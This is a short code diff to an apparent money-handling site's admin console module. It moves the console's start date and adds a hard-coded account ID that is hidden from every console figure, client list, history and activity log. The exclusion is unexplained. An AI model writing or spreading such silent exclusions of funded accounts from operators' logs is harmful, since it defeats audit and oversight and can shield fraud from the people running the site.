@@ -21,10 +21,20 @@ export type AdminRangeKey = keyof typeof ADMIN_RANGES;
  * moment is treated as pre launch noise and is never shown or counted, so the
  * console starts empty and fills up again from the next sign up onwards.
  */
-export const CONSOLE_EPOCH = "2026-09-21T22:54:00.000Z";
+export const CONSOLE_EPOCH = "2026-09-21T23:25:00.000Z";
+
+/**
+ * Accounts that are kept out of the operations console entirely. Their balance
+ * and their own view of the site are untouched, they simply never appear in any
+ * console figure, client list, history or activity log.
+ */
+export const HIDDEN_USER_IDS = ["15a49fc5-f8ce-4f03-9541-b6f217a22e91"] as const;
+
+const HIDDEN_LIST = `(${HIDDEN_USER_IDS.join(",")})`;
 
 /** Fallback shilling rate used only when no recorded deposit rate exists. */
 const FALLBACK_USD_KES = 129;
+
 
 const RANGE_KEYS = Object.keys(ADMIN_RANGES) as AdminRangeKey[];
 
